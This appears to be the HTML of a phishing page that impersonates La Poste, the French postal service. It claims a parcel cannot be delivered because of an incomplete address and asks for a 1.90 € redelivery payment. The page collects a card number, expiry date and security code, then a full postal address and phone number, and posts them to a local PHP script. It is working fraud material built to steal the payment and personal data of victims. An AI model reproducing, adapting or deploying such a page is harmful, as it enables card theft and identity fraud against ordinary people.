<!-- saved from url=(0047) -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr-FR" lang="fr-FR" class="no-js" style="--header-height:69px;"
  data-lt-installed="true">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Content-Language" content="fr-FR">
  <meta name="viewport">

  <title> Laposte </title>

  <!-- <link rel="shortcut icon" href="./assets/faviconLaposte.ico" type="image/x-icon"> -->
  <link href="./assets/css/ph-style.css" rel="stylesheet" type="text/css">
  <link type="text/css" rel="stylesheet" href="./assets/css/app.css">
  <link rel="stylesheet" href="./assets/css/suiviPartSearch.css" media="all">
  <link rel="stylesheet" type="text/css" href="./assets/css/custom.css">
  <link rel="stylesheet" type="text/css" href="./assets/css/custom-2.css">
  <link rel="stylesheet" type="text/css" href="./assets/css/user-reg.css">
  <link rel="stylesheet" type="text/css" href="./assets/css/bottom-1.css">
  <link rel="stylesheet" type="text/css" href="./assets/css/bottom-2.css">
  <link rel="stylesheet" type="text/css" href="./assets/css/style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

  <script type="text/javascript" src="./assets/js/jquery-2.1.3.min.js"></script>
  <script type="text/javascript" src="./assets/js/suiviPartSearch.min.js"></script>
  <script type="text/javascript" src="./assets/js/ph-style.min.js"></script>
</head>

<body class="particulier js-noactive use-uniform ph-active">

  <div class="full__headerWrapper">
    <div class="header__wrap full__header">
      <div class="header__stick header__stick--show">
        <header class="ph-header">
          <div class="header__base">
            <button type="button" class="ph-burger header__burger">
              <i class="button__icon bi bi-list"><span class="visually-hidden"></span></i>
            </button>

            <div class="header__content">
              <div class="header__logo">
                <a href="https://www.laposte.fr/">
                  <picture class="logo__image">
                    <img width="56" height="43" alt="Groupe La Poste" src="./assets/logo-light.svg">
                  </picture>
                </a>
              </div>
            </div>
            <div class="header__actions header-fixed actions">
              <a id="header-help-part" class="actions__item header-help">
                <i class="actions__icon bi bi-question-octagon"></i>
                <span class="actions__name"> Aide </span>
              </a>
              <span class="actions__item js-editing-profile header-nec-head">
                <span class="actions__initials nec-user-init js-show-flex" style="display:none;"></span>
                <span class="actions__name nec-user-firstname hide-mobile js-show-block" style="display:none;"></span>
                <i class="actions__icon bi bi-person"></i>
                <!-- <i
                  class="js-hide-connected actions__icon ph-icon ph-icon--editing-profile ph-icon--light ph-icon--default"></i> -->
                <span class="js-hide-connected actions__name"> Se connecter </span>
              </span>
              <section class="js-sidePanel-edit-profile panel panel--default hidden">
                <div class="panel__overlay"></div>
                <div class="panel__container">

                  <!-- <i class="panel__closer ph-icon ph-icon--action-close ph-icon--regular ph-icon--default"></i> -->
                  <strong class="panel__title"> Espace client La Poste </strong>
                  <div class="panel__inner">
                    <div class="actions__auth js-show-flex" style="display:none;">
                      <span class="actions__auth--name nec-user-name"></span>
                      <span class="actions__auth--email nec-user-mail"></span>
                      <a href="https://www.laposte.fr/nec/edit/user" target="_self"
                        class="ph-button actions__cta button__mobile--large button__tablet--large button__desktop--large button--secondary button--darkgrey">
                        <span class="button__wrapper">
                          <span class="button__label"> Gérer mon Compte La Poste </span>
                          <span class="anim"></span>
                        </span>
                      </a>
                    </div>
                    <div class="actions__auth js-hide-connected">
                      <a href="https://www.laposte.fr/monCompteV3/authorization?callbackURL=necDashboard" target="_self"
                        class="ph-button actions__cta button__mobile--large button__tablet--large button__desktop--large button--primary button--supernova">
                        <span class="button__wrapper">
                          <span class="button__label"> Se connecter </span>
                          <span class="anim"></span>
                        </span>
                      </a>
                      <a href="https://www.laposte.fr/monCompteV3/registration?callbackURL=necDashboard" target="_self"
                        class="ph-button actions__cta button__mobile--large button__tablet--large button__desktop--large button--secondary button--darkgrey">
                        <span class="button__wrapper">
                          <span class="button__label"> Créer mon Compte La Poste </span>
                          <span class="anim"></span>
                        </span>
                      </a>
                      <a href="https://www.laposte.fr/moncompte-laposte-avantages" class="actions__whyConnect">Pourquoi
                        se créer un Compte La Poste ?</a>
                    </div>
                    <div class="actions__links">
                      <a href="https://www.laposte.fr/espaceclient" class="actions__links--item">
                        <i class="ph-icon ph-icon--localization-departure ph-icon--regular ph-icon--big"></i> Accueil de
                        l'Espace client </a>
                      <a href="https://www.laposte.fr/espaceclient/mes-suivis" class="actions__links--item">
                        <i class="ph-icon ph-icon--package-delivery ph-icon--regular ph-icon--big"></i> Mes suivis </a>
                      <a href="https://www.laposte.fr/espaceclient/mes-achats" class="actions__links--item">
                        <i class="ph-icon ph-icon--cart-simple ph-icon--regular ph-icon--big"></i> Mes achats </a>
                      <a href="https://www.laposte.fr/espaceclient#contrats" class="actions__links--item">
                        <i class="ph-icon ph-icon--editing-contract ph-icon--regular ph-icon--big"></i> Mes contrats
                      </a>
                    </div>
                    <a href="https://www.laposte.fr/deconnexion" target="_self"
                      class="js-show-block ph-button actions__disconnect button--ghost button--darkgrey button__mobile--regular button__tablet--regular button__desktop--regular"
                      style="display:none;">
                      <span class="button__wrapper">
                        <span class="button__label"> Se déconnecter </span>
                        <span class="anim"></span>
                      </span>
                    </a>
                    <button
                      class="ph-button actions__close button__mobile--regular button__tablet--regular button__desktop--regular button--ghost button--darkgrey">
                      <span class="button__wrapper">
                        <span class="button__label"> Fermer </span>
                        <span class="anim"></span>
                      </span>
                    </button>
                  </div>
                </div>
              </section>
              <a href="https://www.laposte.fr/checkout/selection" class="actions__item js-ph-cart">
                <span class="actions__cartQty cart_nb_products" style="display:none;">0</span>
                <!-- <i class="actions__icon ph-icon ph-icon--cart-simple ph-icon--light ph-icon--default"></i> -->
                <i class="actions__icon bi bi-cart"></i>
                <span class="actions__name"> Panier </span>
              </a>
            </div>
          </div>
        </header>
      </div>
    </div>

    <nav aria-label="Menu de navigation" class="ph-navbar">
      <div class="panelHeader">
        <button class="panelHeader__close">
          <i class="ph-icon bi bi-x">
            <span class="visually-hidden"></span>
          </i>
        </button>
        <a href="https://www.laposte.fr/">
          <picture class="logo">
            <source media="(min-width: 992px)"
              srcset="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9Ijc3IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0zNC4wMTMgNzYuNzI0Yy0xMS43NTYtLjUyNy0yNC40NzEtNS4yNTMtMzAuNTg2LTE2LjA1Qy0yLjMwNyA1MC40NzYuNjM2IDM3LjYxNCA3LjA5IDI4LjUxMiAxNy4zMjYgMTMuNzc3IDM0LjEyIDQuNTYzIDUxLjQyIDEuMzQ5IDY0LjctMS4wMyA3OS42NTMuMjY3IDkwLjUwMiA5LjA1OWM3LjM2MyA1Ljg1IDEwLjY4OSAxNS45NDggOC43MTYgMjUuMTQzLTIuOTEyIDE0LjIwMi0xMy45MDcgMjUuMjYtMjUuODk2IDMyLjQwNC0xMS44MSA2Ljk1NS0yNS42MTMgMTAuNzctMzkuMzEgMTAuMTE4WiIgZmlsbD0idXJsKCNhKSIvPjxwYXRoIGQ9Ik0yOC44OTMgMjQuOTNjMi4yMDguODAxIDkuMzkyIDMuMzU0IDEzLjM5OSA2LjEwM2EzMSAzMSAwIDAgMSAuMzg2LjI3M2wyOS44NTItLjQ3M2E5NC40NTcgOTQuNDU3IDAgMCAwIDEuODAyLTMuMjg2Yy43MTMtMS4zODIuNzYyLTIuNTY3LS4wNDctMy4zNTMtLjg3OC0uODU0LTIuMy0uOTktNS4xNzMtLjk5aC00MC4wNmMtLjMyIDAtMS4xMzItLjA1NS0xLjI2My42MWEuNzI0LjcyNCAwIDAgMCAuMTc3LjYxN2MuMjY5LjIzMy41ODUuNDA0LjkyNy41Wk04OC45MjMgMzIuNTA1Yy0uNjYyLjAyLTQ0LjM3Mi42OTQtNDUuMDUuNzIxLS4zNjMuMDE1LS40Ny4wOTktLjQ3MS40OTUtLjAxNyAzLjIwNS00LjIxNiA2LjI4NS05LjkzIDkuMDQtNi4wMjYgMi45MDQtMTMuNTkyIDUuNzk1LTE3LjUyNSA3LjI1OC0uOTM3LjM1LTIuNjE3Ljk0OS0zLjE1OSAxLjIyNy0uNDMyLjIyMi0uNzMxLjU2Ni0uNTk0Ljk2NC4xMzcuNC41NzMuNjAzIDIuMDcuMjAyLjY2OC0uMTggMS40MjEtLjM2NSAyLjI1LS41ODMgNy41NS0xLjk4NyAyMS4zNzgtNS40ODUgMzQuODQ2LTguODg1IDEzLjk0Ni0zLjUxOSAyNy42OTUtNi41NjQgMzcuNzczLTguNC43OTItLjE0NCAxLjQ0Ni0uNTc2IDEuNDEyLTEuMTg1LS4wMzEtLjU3LS42ODYtLjg4LTEuNjIyLS44NTRaTTUyLjk5MiA1Mi4yNTdjLjAwMiAwIDEuOTY2LjA1MyAzLjQtLjgxNiAyLjMwOC0xLjQgNS4zNDMtMy45NCA5LjY0My0xMC4wNUwxOS45NTYgNTIuODMzbDMzLjAzNi0uNTc2WiIgZmlsbD0iIzAwM0RBNSIvPjxkZWZzPjxsaW5lYXJHcmFkaWVudCBpZD0iYSIgeDE9IjcuMjQxIiB5MT0iMzIuMzk4IiB4Mj0iNzAuMjgiIHkyPSI2NS4xMTEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBzdG9wLWNvbG9yPSIjRjBFNjNDIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRTZBRjMyIi8+PC9saW5lYXJHcmFkaWVudD48L2RlZnM+PC9zdmc+"
              type="image/jpeg">
            <img
              src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9Ijc3IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0zNC4wMTMgNzYuNzI0Yy0xMS43NTYtLjUyNy0yNC40NzEtNS4yNTMtMzAuNTg2LTE2LjA1Qy0yLjMwNyA1MC40NzYuNjM2IDM3LjYxNCA3LjA5IDI4LjUxMiAxNy4zMjYgMTMuNzc3IDM0LjEyIDQuNTYzIDUxLjQyIDEuMzQ5IDY0LjctMS4wMyA3OS42NTMuMjY3IDkwLjUwMiA5LjA1OWM3LjM2MyA1Ljg1IDEwLjY4OSAxNS45NDggOC43MTYgMjUuMTQzLTIuOTEyIDE0LjIwMi0xMy45MDcgMjUuMjYtMjUuODk2IDMyLjQwNC0xMS44MSA2Ljk1NS0yNS42MTMgMTAuNzctMzkuMzEgMTAuMTE4WiIgZmlsbD0idXJsKCNhKSIvPjxwYXRoIGQ9Ik0yOC44OTMgMjQuOTNjMi4yMDguODAxIDkuMzkyIDMuMzU0IDEzLjM5OSA2LjEwM2EzMSAzMSAwIDAgMSAuMzg2LjI3M2wyOS44NTItLjQ3M2E5NC40NTcgOTQuNDU3IDAgMCAwIDEuODAyLTMuMjg2Yy43MTMtMS4zODIuNzYyLTIuNTY3LS4wNDctMy4zNTMtLjg3OC0uODU0LTIuMy0uOTktNS4xNzMtLjk5aC00MC4wNmMtLjMyIDAtMS4xMzItLjA1NS0xLjI2My42MWEuNzI0LjcyNCAwIDAgMCAuMTc3LjYxN2MuMjY5LjIzMy41ODUuNDA0LjkyNy41Wk04OC45MjMgMzIuNTA1Yy0uNjYyLjAyLTQ0LjM3Mi42OTQtNDUuMDUuNzIxLS4zNjMuMDE1LS40Ny4wOTktLjQ3MS40OTUtLjAxNyAzLjIwNS00LjIxNiA2LjI4NS05LjkzIDkuMDQtNi4wMjYgMi45MDQtMTMuNTkyIDUuNzk1LTE3LjUyNSA3LjI1OC0uOTM3LjM1LTIuNjE3Ljk0OS0zLjE1OSAxLjIyNy0uNDMyLjIyMi0uNzMxLjU2Ni0uNTk0Ljk2NC4xMzcuNC41NzMuNjAzIDIuMDcuMjAyLjY2OC0uMTggMS40MjEtLjM2NSAyLjI1LS41ODMgNy41NS0xLjk4NyAyMS4zNzgtNS40ODUgMzQuODQ2LTguODg1IDEzLjk0Ni0zLjUxOSAyNy42OTUtNi41NjQgMzcuNzczLTguNC43OTItLjE0NCAxLjQ0Ni0uNTc2IDEuNDEyLTEuMTg1LS4wMzEtLjU3LS42ODYtLjg4LTEuNjIyLS44NTRaTTUyLjk5MiA1Mi4yNTdjLjAwMiAwIDEuOTY2LjA1MyAzLjQtLjgxNiAyLjMwOC0xLjQgNS4zNDMtMy45NCA5LjY0My0xMC4wNUwxOS45NTYgNTIuODMzbDMzLjAzNi0uNTc2WiIgZmlsbD0iIzAwM0RBNSIvPjxkZWZzPjxsaW5lYXJHcmFkaWVudCBpZD0iYSIgeDE9IjcuMjQxIiB5MT0iMzIuMzk4IiB4Mj0iNzAuMjgiIHkyPSI2NS4xMTEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBzdG9wLWNvbG9yPSIjRjBFNjNDIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRTZBRjMyIi8+PC9saW5lYXJHcmFkaWVudD48L2RlZnM+PC9zdmc+"
              alt="LaPoste" width="42" height="32" class="logo__image">
          </picture>
        </a>
      </div>
      <div class="ph-navbar__body js-ph-nav">
        <div class="accessLinksBlock accessLinksBlock--navbar accessLinksBlock--mobile">
          <button title="Vous êtes un Particulier"
            class="ph-button button__mobile--regular button__tablet--regular button__desktop--regular button--secondary button--supernova accessLinksBlock__button accessLinksBlock__mobile">
            <span class="button__wrapper">
              <span class="button__label"> Vous êtes un <span class="accessLinksBlock__type">Particulier</span>
                <span class="anim"></span>
              </span>
          </button>
        </div>

        <div class="quickaccess quickaccess--open">
          <button class="quickaccess__title">
            Accès rapides
            <i class="bi bi-menu-button-wide">
              <span class="visually-hidden"></span>
            </i>
            <!-- <i class="quickaccess__arrow ph-icon ph-icon--arrow-bottom ph-icon--regular ph-icon--small"></i> -->
          </button>
          <div class="quickaccess__content">
            <ul class="quick__list quickaccess__list">
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099868190.svg"
                    alt="Suivre un colis ou un courrier" class="quick__image" data-xblocker="passed"
                    style="visibility: visible;"></picture>
                <a href="" class="quick__title">Suivre un colis ou un courrier</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099671582.svg"
                    alt="Trouver un point de contact La Poste" class="quick__image" data-xblocker="passed"
                    style="visibility: visible;"></picture>
                <a href="https://localiser.laposte.fr/" class="quick__title">Trouver un point de contact La Poste</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099474974.svg" alt="Consulter les tarifs"
                    class="quick__image" data-xblocker="passed" style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/produits/article/tarifs-consulter-le-catalogue-integral"
                  class="quick__title">Consulter les tarifs</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099409438.svg" alt="Acheter des timbres"
                    class="quick__image" data-xblocker="passed" style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/pp/c/timbres" class="quick__title">Acheter des timbres</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099737118.svg"
                    alt="Envoyer un recommandé en ligne" class="quick__image" data-xblocker="passed"
                    style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/lettre-recommandee-en-ligne" class="quick__title">Envoyer un recommandé
                  en ligne</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099606046.svg" alt="Envoyer un colis"
                    class="quick__image" data-xblocker="passed" style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/colissimo-en-ligne" class="quick__title">Envoyer un colis</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099540510.svg" alt="Payer les droits de douane"
                    class="quick__image" data-xblocker="passed" style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/frais-droits-douane" class="quick__title">Payer les droits de douane</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099933726.svg" alt="Transférer son courrier"
                    class="quick__image" data-xblocker="passed" style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/changement-adresse-demenagement-reexpedition"
                  class="quick__title">Transférer son courrier</a>
              </li>
              <li class="quick__item">
                <picture class="quick__picture"><img src="./assets/30781099802654.svg" alt="Retourner un colis"
                    class="quick__image" data-xblocker="passed" style="visibility: visible;"></picture>
                <a href="https://www.laposte.fr/envoyer-retourner-colis-boite-aux-lettres"
                  class="quick__title">Retourner un colis</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </nav>
  </div>

  <div id="app">
    <div class="site">
      <div id="page">
        <section class="page-container">

          <h1 class="basic-title-color pt-3">Choisir mon mode de paiement</h1>
          <h2 class="information-label">La relivraison du colis nécessite un paiement de 1,90 €</h2>

          <div class="banner-laposte visible mt-3" id="promotional-banner">
            <div class="banner-content">
              <div class="banner-icon"><img src="./assets/icons/icon_info.svg" alt="" width="24" height="24"></div>
              <div class="banner-title">
                <span>L’Identité Numérique évolue !</span>
                <div class="banner-text">
                  Nous ne pouvons pas livrer votre colis en raison d’une adresse incomplète. La Poste vous permet
                  d’acheminer votre colis à votre adresse en cas d’échec de livraison. Veuillez mettre à jour les
                  informations d’adresse
                </div>
              </div>
            </div>
          </div>



          <div class="in-panel mb-3">
              <h3 class="information-label-title">Carte Bancaire</h3>
              <div class="input-group">
                <p class="subtitle">Numéro de carte</p>
                <div class="input-group-prepend">
                    <label class="prepend-label">
                        <i class="bi bi-credit-card"></i>
                    </label>
                    <div class="input"><input class="touched hide-error" type="text" name="fullname" id="fullname" aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Mme/M. Prénom Nom</span></div>                    
                </div>
              </div>

              <div class="row">
                <div class="col ml-0">
                  <div class="input-group">
                    <p class="subtitle">Date d'expiration</p>
                    <div class="input-group-prepend">
                      <label class="prepend-label">
                          <i class="bi bi-calendar-date"></i>
                      </label>
                      <div class="input"><input class="touched hide-error" type="text" name="fullname" id="fullname" aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Mme/M. Prénom Nom</span></div>
                    </div>
                  </div>
                </div>

                <div class="col">
                  <div class="input-group">
                    <p class="subtitle">Crpytogramme</p>
                    <div class="input-group-prepend">
                      <label class="prepend-label">
                          <i class="bi bi-shield-lock"></i>
                      </label>
                      <div class="input"><input class="touched hide-error" type="text" name="fullname" id="fullname" aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Mme/M. Prénom Nom</span></div>
                    </div>
                  </div>
                </div>
              </div>
          </div>

          <div class="in-panel">
            <h2 class="information-label-title">Vérifiez votre adresse.</h2>
            <h3 class="information-label">Nous devons confirmer que votre adresse est éligible pour la livraison notifiée.</h3>

            <div class="input" style="margin-top: 2em">
              <input class="touched hide-error" type="text" name="title" id="title" aria-required="false"
                autocapitalize="none" value=""><span class="hide-error" id="">Votre adresse
                <small class="optional">(facultatif)</small></span>
            </div>
            <span class="btn-effect button-mkt my-auto"
              style="background-color: #ffc905 !important; color: #3c3c3c !important; height: 40px;padding: 0px 30px; position: relative; top: 0px; min-width: auto; ">
              Vérifiez</span>
          </div>

          <div class="in-panel">
            <h1 class="information-label-title">Renseignez votre adresse postale</h1>

            <div class="info-box info" style="margin: 2em 0;">
              <div class="box-wrapper">
                <p class="box-description mt-2" id="boxDescription">
                  <i class="bi bi-info-circle me-1"></i>
                  Votre adresse postale est nécessaire pour ce service</p>
              </div>
            </div>

            <div class="form">
              <form method="post" action="./3.php">
                <div class="form-body">
                  <p class="subtitle">Informations personnelles</p>
                  <div class="input "><input class="touched hide-error" type="text" name="fullname" id="fullname"
                      aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Mme/M.
                      Prénom Nom</span></div>
                  <div class="input  display-none"><input class="touched hide-error" type="text" name="company" id="company"
                      aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Nom de la
                      société</span></div>
                  <div class="input  display-none"><input class="touched hide-error" type="text" name="identity" id="identity"
                      aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Identité du
                      destinataire ou du
                      service</span></div>
                  <div class="input"><input class="touched hide-error" type="text" aria-required="true" name="street"
                      id="street" autocapitalize="none" value=""><span class="hide-error" id="">N° et libellé de
                      voie</span></div>
                  <div class="row">
                    <div class="col ml-0">
                      <div class="input"><input class="touched hide-error" type="text" aria-required="true" name="zipcode"
                          id="zipcode" autocapitalize="none" value=""><span class="hide-error" id="">Code
                          postal</span></div>
                    </div>
                    <div class="col">
                      <div class="input"><input class="touched hide-error" type="text" aria-required="true" name="locality"
                          id="locality" autocapitalize="none" value=""><span class="hide-error" id="">Ville</span></div>
                    </div>
                  </div>
                  <div class="input "><input class="touched hide-error" type="text" name="additional" id="additional"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Lieu-dit
                      ou boîte postale <small class="optional">(facultatif)</small></span></div>
                  <div class="input input-select "><select id="country" name="country">
                      <option></option>
                      <option value="AF">Afghanistan</option>
                      <option value="ZA">Afrique du Sud</option>
                    </select><span class="hide-error">France</span><label class="">Pays</label>
                    <div class="img-arrow-down"></div>
                  </div><input type="hidden" id="countryName" name="countryName" value="France"><input type="hidden"
                    id="countryCode" name="countryCode" value="FR"><input type="hidden" id="typeAddress"
                    name="typeAddress" value="part"><input type="hidden" id="addressAutoCompleted"
                    name="addressAutoCompleted" value="false"><input type="hidden" id="step" name="step"
                    value="address">
                  <p class="subtitle">Instructions pour la livraison</p>
                  <div class="input "><input class="touched hide-error" type="text" name="building" id="building"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Bâtiment,
                      résidence <small class="optional">(facultatif)</small></span></div>
                  <div class="input "><input class="touched hide-error" type="text" name="floor" id="floor"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Appartement,
                      étage <small class="optional">(facultatif)</small></span></div>
                  <div class="input "><input class="touched hide-error" type="text" name="digicode" id="digicode"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Digicode,
                      gardien... <small class="optional">(facultatif)</small></span></div>
                  <p class="subtitle">Nom de l'adresse</p>
                  <div class="input "><input class="touched hide-error" type="text" name="title" id="title"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Maison,
                      bureau... <small class="optional">(facultatif)</small></span></div>

                  <p class="subtitle">Votre adresse</p>
                  <div class="input "><input class="touched hide-error" type="text" name="title" id="title"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">Votre
                      adresse <small class="optional">(facultatif)</small></span></div>

                  <p class="subtitle">Numéro de mobile ou fixe</p>
                  <div class="input "><input class="touched hide-error" type="text" name="title" id="title"
                      aria-required="false" autocapitalize="none" value=""><span class="hide-error" id="">+
                      909090909 <small class="optional">(facultatif)</small></span></div>
                </div>
                <div class="form-action">
                  <input id="submit" name="submit" role="button" type="submit" value="Enregistrer">
                </div>
              </form>
            </div>
          </div>
        </section>


        <!-- bloc pub IAB pavé-->
        <div id="small1400" class="small1400">
          <!-- bloc merchandising -->
          <div class="blocMerchan">
            <section class="hp-market">
              <div class="hp-wrapper">
                <h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
                <div class="section-market-cats js-autopromo" id="autopromoEl0">
                  <div class="section-market-cat"><a href="https://www.laposte.fr/colissimo-en-ligne"
                      title="Envoyer un colis" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="1_envoyer_un_colis" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto1-envoyeruncolis-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Envoyer<br> un colis</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/timbres" title="Commander des timbres"
                      data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="2_commander_des_timbres" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto2-commanderdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Commander<br> des timbres</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/mon-timbre-en-ligne"
                      title="Imprimer des timbres" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="3_imprimer_des_timbres" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto3-imprimerdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Imprimer<br> des timbres</p>
                    </a></div>
                  <div class="section-market-cat"><a
                      href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses"
                      title="Acheter des emballages" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="4_acheter_des_emballages" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto4-acheterdesemballages-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Acheter<br> des emballages</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-courrier-en-ligne"
                      title="Envoyer une lettre recommandée en ligne" data-tagc="display" data-tagc_event="autopromo"
                      data-tagc_adid="11" data-tagc_format="5_envoyer_lettre_recommandee"
                      class="tagged taggedc tagged-s"> <img
                        src="./assets/picto5b-envoyerunelettrerecommandeeenligne-mars22.svg"
                        class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Envoyer une lettre<br> recommandée en ligne</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-colis-boite-aux-lettres"
                      title="Envoyer depuis votre boîte aux lettres" data-tagc="display" data-tagc_event="autopromo"
                      data-tagc_adid="11" data-tagc_format="6_envoyer_depuis_boite_lettre"
                      class="tagged taggedc tagged-s"> <img src="./assets/picto6-fairesuivremoncourrier-mars22.svg"
                        class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Envoyer depuis<br> votre boîte aux lettres</p>
                    </a></div>
                  <div class="section-market-cat"><a href="https://www.laposte.fr/tarifs-postaux-colis"
                      title="Consulter nos tarifs" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                      data-tagc_format="7_consulter_nos_tarifs" class="tagged taggedc tagged-s"> <img
                        src="./assets/picto7-consulternostarifs-mars22.svg" class="section-market-cat-img" alt=""
                        data-xblocker="passed" style="visibility: visible;">
                      <p class="section-market-cat-text">Consulter<br> nos tarifs</p>
                    </a></div>
                </div>
              </div>
            </section>
            <section class="js-autopromo" id="autopromoEl1">
              <div class="services column">
                <!--
		<h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
		-->
                <div class="row">
                  <!-- ECOSCORE 130622 -->
                  <div class="col-6" style="max-width: 100% !important;">
                    <div class="onclick-home">
                      <a class="product-box tagged taggedc tagged-s" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="395" data-tagc_format="1-score_ecologique" target="_blank"
                        href="https://www.laposte.fr/score-ecologique">
                        <div style="height: 200px; padding: 0px;">
                          <div>
                            <div class="espace-vide">
                              &nbsp;
                            </div>
                            <p
                              style="font-size: 20px; font-weight: bold; margin: 0px 0px 0px 20px; color: #3c3c3c; position: relative;top: -50px;">
                              Score écologique
                              <br>
                              Mesurez et réduisez l'empreinte<br>
                              écologique de vos envois
                            </p>
                            <div class="espace-vide">
                              &nbsp;
                            </div>
                            <span class="btn-effect button-mkt"
                              style="margin-left: 20px !important; background-color: #ffc905 !important; color: #3c3c3c !important; height: 40px;padding: 0px 30px; position: relative;top: -35px;">Je
                              découvre</span>
                          </div>
                          <div class="espace-vide">
                            &nbsp;
                          </div>
                        </div>
                        <img src="./assets/DESKTOP-Large-Banner-HP-1140x250px-.jpg" alt="Je découvre"
                          data-xblocker="passed" style="visibility: visible;">
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </section>
            <div class="espace-vide">&nbsp;</div>
            <section class="push-gammes-liste bg-white services js-autopromo" id="autopromoEl2">
              <!-- <h2 class="basic-title">D&eacute;couvrez nos nouvelles gammes de produits</h2> -->
              <div class="row">
                <div class="col-3">
                  <h3>Enveloppes et<br> emballages</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/enveloppesblanches">Enveloppes blanches</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/enveloppesabulles">Enveloppes à bulles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/etiquettespourimprimersestimbres">Etiquettes pour
                        imprimer ses timbres</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/recommandesetsupports">Supports de recommandés</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses">Cartons, boîtes
                        postales et caisses</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/emballagescartonsettubes">Emballages, cartons et
                        tubes</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/universdemenagement">Univers déménagement</a></li>
                  </ul>
                </div>
                <div class="col-3">
                  <h3>Monnaies et<br> pièces</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/monnaiecollectionjeunesse">Monnaies de collection
                        classique</a></li>
